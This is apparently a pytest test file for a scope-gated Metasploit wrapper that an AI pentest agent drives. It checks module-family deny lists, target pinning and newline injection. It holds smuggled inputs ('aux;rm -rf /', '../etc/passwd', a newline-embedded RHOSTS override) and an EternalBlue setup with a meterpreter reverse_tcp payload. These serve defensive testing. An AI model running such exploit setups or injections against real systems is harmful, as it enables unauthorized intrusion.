import pytest

from scope.models import TestCategory
from tools.metasploit import (
    build_resource_script,
    category_for_module,
    _parse_msf_output,
    _validate_options,
    run_command,
    run_module,
    validate_setup_lines,
)


# --- module family -> category derivation / gating -------------------------

def test_auxiliary_module_maps_to_aux_scan():
    assert category_for_module("auxiliary/scanner/smb/smb_version") == TestCategory.AUX_SCAN


def test_exploit_module_maps_to_exploit():
    assert category_for_module("exploit/windows/smb/ms17_010_eternalblue") == TestCategory.EXPLOIT


@pytest.mark.parametrize(
    "module",
    [
        "payload/windows/meterpreter/reverse_tcp",
        "post/windows/gather/hashdump",
        "encoder/x86/shikata_ga_nai",
        "nop/x86/opty2",
        "evasion/windows/windows_defender_exe",
        "auxiliary/dos/tcp/synflood",
    ],
)
def test_denied_families_are_refused(module):
    with pytest.raises(ValueError):
        category_for_module(module)


@pytest.mark.parametrize("module", ["", "Exploit/Foo", "aux;rm -rf /", "foo/bar", "../etc/passwd"])
def test_invalid_or_unknown_modules_refused(module):
    with pytest.raises(ValueError):
        category_for_module(module)


# --- resource script construction ------------------------------------------

def test_rhosts_is_forced_from_target():
    script = build_resource_script(
        "auxiliary/scanner/smb/smb_version", "10.0.0.5", {}, "run", None
    )
    assert "set RHOSTS 10.0.0.5" in script
    assert script.strip().endswith("exit")
    assert "use auxiliary/scanner/smb/smb_version" in script


def test_port_sets_rport():
    script = build_resource_script("auxiliary/scanner/ssh/ssh_version", "10.0.0.5", {}, "run", 2222)
    assert "set RPORT 2222" in script


def test_caller_cannot_override_rhosts():
    with pytest.raises(ValueError):
        _validate_options({"RHOSTS": "8.8.8.8"})
    with pytest.raises(ValueError):
        _validate_options({"rhost": "8.8.8.8"})


def test_option_value_newline_injection_refused():
    # A newline would let the agent append extra resource-script commands after
    # the `set`, e.g. re-targeting RHOSTS past the scope gate.
    with pytest.raises(ValueError):
        _validate_options({"THREADS": "5\nset RHOSTS 8.8.8.8"})


def test_option_key_charset_enforced():
    with pytest.raises(ValueError):
        _validate_options({"BAD KEY": "1"})


def test_clean_options_pass_through():
    assert _validate_options({"THREADS": "5", "VERBOSE": "true"}) == {
        "THREADS": "5",
        "VERBOSE": "true",
    }


# --- output parsing --------------------------------------------------------

_SAMPLE = """
[*] Started reverse handler
[+] 10.0.0.5:445 - Host is likely VULNERABLE to MS17-010!
[-] 10.0.0.6:445 - Not vulnerable
[*] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.5:49158)
some noisy non-status line
"""


def test_parse_extracts_signals_and_session():
    signals, session_opened = _parse_msf_output(_SAMPLE)
    assert session_opened is True
    assert any("VULNERABLE" in s for s in signals)
    assert any(s.startswith("[-]") for s in signals)
    assert "some noisy non-status line" not in signals


def test_parse_no_session():
    signals, session_opened = _parse_msf_output("[*] no luck\n[-] Not vulnerable\n")
    assert session_opened is False
    assert len(signals) == 2


# --- run_module fails closed before spawning --------------------------------

async def test_run_module_rejects_bad_action():
    with pytest.raises(ValueError):
        await run_module(None, "10.0.0.5", "auxiliary/scanner/smb/smb_version", action="nope")


async def test_run_module_rejects_denied_module_before_execution():
    # No executor needed: the module family is rejected before authorize()/
    # subprocess, so passing None proves nothing tried to run.
    with pytest.raises(ValueError):
        await run_module(None, "10.0.0.5", "payload/windows/meterpreter/reverse_tcp")


# --- open-ended runner: agent authors the command, target stays bound -------

def test_setup_lines_allow_arbitrary_directives():
    # The agent can freely pick module, payload, LHOST etc. -- open-ended.
    setup = [
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "set LHOST 10.0.0.1",
        "set LPORT 4444",
    ]
    assert validate_setup_lines(setup) == setup


def test_setup_lines_refuse_retargeting():
    # The one thing the agent cannot do: change the target. RHOSTS is ours.
    for line in ["set RHOSTS 8.8.8.8", "setg RHOST 8.8.8.8", "  SET rhosts 1.1.1.1"]:
        with pytest.raises(ValueError):
            validate_setup_lines(["use exploit/foo", line])


def test_setup_lines_refuse_dos_module():
    with pytest.raises(ValueError):
        validate_setup_lines(["use auxiliary/dos/tcp/synflood"])


def test_setup_lines_refuse_embedded_newline():
    with pytest.raises(ValueError):
        validate_setup_lines(["use exploit/foo\nset RHOSTS 8.8.8.8"])


async def test_run_command_rejects_bad_action():
    with pytest.raises(ValueError):
        await run_command(None, "10.0.0.5", ["use exploit/foo"], action="nope")


async def test_run_command_fails_closed_on_retarget_before_execution():
    # Passing None as executor proves no subprocess/authorize was reached: the
    # retargeting line is refused first.
    with pytest.raises(ValueError):
        await run_command(None, "10.0.0.5", ["use exploit/foo", "set RHOSTS 8.8.8.8"])
